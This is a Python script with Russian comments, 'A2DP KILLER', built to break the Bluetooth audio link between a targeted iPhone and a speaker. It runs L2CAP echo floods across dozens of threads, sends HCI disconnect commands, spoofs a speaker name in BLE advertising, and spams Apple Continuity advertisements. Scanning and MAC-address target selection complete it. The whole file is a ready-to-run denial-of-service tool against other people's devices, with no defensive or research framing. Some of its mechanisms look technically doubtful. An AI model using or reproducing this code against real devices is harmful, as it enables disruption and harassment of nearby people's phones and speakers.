#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ANTIDOX A2DP KILLER — разрыв Bluetooth-соединения iPhone ↔ колонка

import os
import sys
import time
import random
import struct
import socket
import threading
import subprocess
import signal
from datetime import datetime

# ========================================================================
# КОНСТАНТЫ
# ========================================================================
L2CAP_PSM_SDP = 0x0001
L2CAP_ECHO_REQ = 0x08
HCI_COMMAND_PKT = 0x01

# ========================================================================
# БЛОК 1: L2CAP-ФЛУД (основная атака)
# ========================================================================
def create_l2cap_echo_packet(identifier, data=None):
    if data is None:
        data = bytes([random.randint(0, 255) for _ in range(60)])
    cid = 0x0001
    cmd_code = L2CAP_ECHO_REQ
    cmd_id = identifier & 0xFF
    cmd_len = len(data)
    command = struct.pack('<BBH', cmd_code, cmd_id, cmd_len) + data
    packet_len = len(command) + 4
    header = struct.pack('<HH', packet_len, cid)
    return header + command

def l2cap_flood_worker(target_mac, rate=2000):
    """Поток для L2CAP-флуда"""
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
        sock.bind(('hci0', L2CAP_PSM_SDP))
        sock.connect((target_mac, L2CAP_PSM_SDP))
        counter = 0
        while True:
            pkt = create_l2cap_echo_packet(counter, data=bytes([random.randint(0,255) for _ in range(60)]))
            sock.send(pkt)
            counter += 1
            time.sleep(1.0 / rate)
    except Exception as e:
        pass

# ========================================================================
# БЛОК 2: LMP_TERMINATE (принудительный разрыв)
# ========================================================================
def send_lmp_terminate(sock, target_mac):
    """Отправляет LMP_terminate_Ind на целевое устройство"""
    # HCI_Disconnect (OGF=0x01, OCF=0x0006)
    # Параметры: Connection_Handle (2 байта) + Reason (1 байт)
    # Reason 0x13 = Remote User Terminated Connection
    try:
        # Получаем handle соединения через hcitool
        result = subprocess.run(['sudo', 'hcitool', 'con'], capture_output=True, text=True)
        lines = result.stdout.strip().split('\n')
        handle = None
        for line in lines:
            if target_mac.lower() in line.lower():
                parts = line.split()
                for part in parts:
                    if part.startswith('handle'):
                        handle = int(part.split('<')[0].split(':')[1].strip(), 16)
                        break
                break
        if handle is None:
            print(f"[!] Не найден handle для {target_mac}")
            return False
        
        # Отправляем HCI_Disconnect
        opcode = (0x01 << 10) | 0x0006
        params = struct.pack('<HB', handle, 0x13)  # Reason = Remote User Terminated
        header = struct.pack('<BHB', HCI_COMMAND_PKT, opcode, len(params))
        sock.send(header + params)
        print(f"[+] Отправлен LMP_terminate на {target_mac} (handle=0x{handle:04X})")
        return True
    except Exception as e:
        print(f"[!] Ошибка LMP_terminate: {e}")
        return False

# ========================================================================
# БЛОК 3: СПУФИНГ КОЛОНКИ (обман iPhone)
# ========================================================================
def spoof_speaker_worker(speaker_mac):
    """Имитирует колонку, чтобы iPhone пытался переподключиться"""
    # Создаём виртуальный интерфейс с MAC колонки (требует поддержки)
    # Упрощённо: просто включаем рекламу с именем колонки
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        sock.bind((0,))
        # Включаем рекламу
        opcode = (0x08 << 10) | 0x000A
        sock.send(struct.pack('<BHB', HCI_COMMAND_PKT, opcode, 1) + b'\x01')
        
        # Отправляем имя в рекламных данных
        name = b"JBL Flip 6"  # подставь имя своей колонки
        data = bytearray()
        data.append(len(name) + 1)  # длина
        data.append(0x09)  # тип Local Name
        data.extend(name)
        opcode = (0x08 << 10) | 0x0008
        cmd = struct.pack('<B', len(data)) + data
        sock.send(struct.pack('<BHB', HCI_COMMAND_PKT, opcode, len(cmd)) + cmd)
        print(f"[+] Спуфинг колонки запущен (имя: {name.decode()})")
    except Exception as e:
        print(f"[!] Ошибка спуфинга: {e}")

# ========================================================================
# БЛОК 4: BLE-СПАМ (дестабилизация iPhone)
# ========================================================================
def ble_spam_worker():
    """BLE-спам для перегрузки стека Bluetooth на iPhone"""
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        sock.bind((0,))
        # Включаем рекламу
        opcode = (0x08 << 10) | 0x000A
        sock.send(struct.pack('<BHB', HCI_COMMAND_PKT, opcode, 1) + b'\x01')
        
        types = [0x27, 0x09, 0x02, 0x1E, 0x2B, 0x2D, 0x2F, 0x01, 0x06, 0x20, 0xC0]
        count = 0
        while True:
            # Apple Continuity Spam
            data = bytearray()
            data.append(16)  # длина
            data.append(0xFF)  # Manufacturer Specific
            data.extend([0x4C, 0x00])  # Apple ID
            data.append(0x0F)  # Continuity
            data.append(0x05)
            data.append(0xC1)
            data.append(random.choice(types))
            data.extend([random.randint(0,255) for _ in range(10)])
            
            opcode = (0x08 << 10) | 0x0008
            cmd = struct.pack('<B', len(data)) + data
            sock.send(struct.pack('<BHB', HCI_COMMAND_PKT, opcode, len(cmd)) + cmd)
            count += 1
            if count % 100 == 0:
                print(f"[BLE-SPAM] Отправлено {count} пакетов")
            time.sleep(0.015)  # ~66 пакетов/сек
    except Exception as e:
        print(f"[BLE-SPAM] Ошибка: {e}")

# ========================================================================
# БЛОК 5: ПОИСК КОЛОНКИ
# ========================================================================
def find_speaker(iphone_mac):
    """Ищет устройство, к которому подключён iPhone (колонку)"""
    print("[*] Поиск колонки...")
    try:
        # Получаем список подключённых устройств
        result = subprocess.run(['sudo', 'hcitool', 'con'], capture_output=True, text=True)
        lines = result.stdout.strip().split('\n')
        for line in lines:
            if iphone_mac.lower() in line.lower():
                # Ищем MAC колонки в строке
                parts = line.split()
                for part in parts:
                    if ':' in part and len(part) == 17 and part.lower() != iphone_mac.lower():
                        print(f"[+] Найдена колонка: {part}")
                        return part
    except Exception as e:
        print(f"[!] Ошибка поиска колонки: {e}")
    return None

# ========================================================================
# БЛОК 6: ОСНОВНОЙ КЛАСС
# ========================================================================
class A2DPKiller:
    def __init__(self):
        self.iphone_mac = None
        self.speaker_mac = None
        self.running = False
        self.threads = []
    
    def start(self, target_mac):
        self.iphone_mac = target_mac
        self.running = True
        
        print("="*70)
        print("  A2DP KILLER v2.0 — разрыв соединения iPhone ↔ Колонка")
        print(f"  Цель (iPhone): {self.iphone_mac}")
        print("="*70)
        
        # Ищем колонку
        self.speaker_mac = find_speaker(self.iphone_mac)
        if self.speaker_mac:
            print(f"[+] Колонка найдена: {self.speaker_mac}")
        else:
            print("[!] Колонка не найдена. Атака только на iPhone.")
        
        # Открываем HCI-сокет для отправки команд
        try:
            self.hci_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
            self.hci_sock.bind((0,))
        except Exception as e:
            print(f"[!] Ошибка открытия HCI-сокета: {e}")
            return
        
        # Запускаем атаки
        print("[*] Запуск атак...")
        
        # 1. L2CAP-флуд на iPhone
        for i in range(60):
            t = threading.Thread(target=l2cap_flood_worker, args=(self.iphone_mac, 1500), daemon=True)
            t.start()
            self.threads.append(t)
            time.sleep(0.02)
        print("[+] L2CAP-флуд на iPhone запущен (60 потоков)")
        
        # 2. LMP_terminate на iPhone (если есть соединение)
        t = threading.Thread(target=send_lmp_terminate, args=(self.hci_sock, self.iphone_mac), daemon=True)
        t.start()
        self.threads.append(t)
        print("[+] LMP_terminate отправлен")
        
        # 3. BLE-спам на iPhone
        t = threading.Thread(target=ble_spam_worker, daemon=True)
        t.start()
        self.threads.append(t)
        print("[+] BLE-спам запущен")
        
        # 4. Если найдена колонка — атакуем её тоже
        if self.speaker_mac:
            # L2CAP-флуд на колонку (20 потоков)
            for i in range(20):
                t = threading.Thread(target=l2cap_flood_worker, args=(self.speaker_mac, 1000), daemon=True)
                t.start()
                self.threads.append(t)
                time.sleep(0.02)
            print(f"[+] L2CAP-флуд на колонку запущен (20 потоков)")
            
            # LMP_terminate на колонку
            t = threading.Thread(target=send_lmp_terminate, args=(self.hci_sock, self.speaker_mac), daemon=True)
            t.start()
            self.threads.append(t)
            print("[+] LMP_terminate на колонку отправлен")
        
        print("\n[+] Все атаки запущены. Музыка должна прерваться через 5-10 секунд.")
        print("[+] Нажмите Ctrl+C для остановки.\n")
        
        try:
            while self.running:
                time.sleep(5)
                # Показываем статистику
                active = sum(1 for t in self.threads if t.is_alive())
                print(f"[STATUS] Активно потоков: {active}")
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        print("\n[!] Остановка атак...")
        self.running = False
        try:
            self.hci_sock.close()
        except:
            pass
        
        # Сброс адаптера
        subprocess.run(['sudo', 'hciconfig', 'hci0', 'reset'], capture_output=True)
        print("[+] Адаптер сброшен. Выход.")
        sys.exit(0)

# ========================================================================
# ТОЧКА ВХОДА
# ========================================================================
def main():
    if os.geteuid() != 0:
        print("[!] Требуются права root. Запустите с sudo.")
        sys.exit(1)
    
    # Проверка адаптера
    try:
        subprocess.run(['sudo', 'hciconfig', 'hci0', 'up'], check=True)
    except:
        print("[!] Bluetooth адаптер hci0 не найден.")
        sys.exit(1)
    
    # Если MAC не указан — сканируем
    if len(sys.argv) < 2:
        print("[*] Сканирование устройств...")
        result = subprocess.run(['sudo', 'hcitool', 'scan'], capture_output=True, text=True)
        lines = result.stdout.strip().split('\n')[1:]
        if lines:
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    mac = parts[0]
                    name = ' '.join(parts[1:])
                    print(f"  {mac} - {name}")
            target = input("\nВведите MAC-адрес iPhone: ").strip()
        else:
            print("[!] Устройств не найдено.")
            sys.exit(1)
    else:
        target = sys.argv[1]
    
    killer = A2DPKiller()
    killer.start(target)

if __name__ == "__main__":
    main()
